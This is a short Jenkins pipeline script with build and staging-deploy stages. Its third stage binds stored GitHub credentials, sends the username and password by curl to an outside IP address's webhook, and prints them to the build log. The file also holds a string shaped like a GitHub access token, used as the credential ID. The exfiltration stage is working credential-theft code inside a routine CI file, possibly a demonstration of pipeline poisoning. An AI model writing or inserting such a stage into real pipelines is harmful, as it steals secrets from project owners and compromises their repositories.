node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials | Decrypt GITHUB Password') {
      withCredentials([usernamePassword(credentialsId: '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',
                                        passwordVariable: 'password',
                                        usernameVariable: 'username')]) {
        creds = "\nUsername: ${username}\nPassword: ${password}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"username":"'${username}'","password":"'${password}'"}}' 'http://35.212.146.133:5000/webhook'
        '''
      }
      println creds
    }
}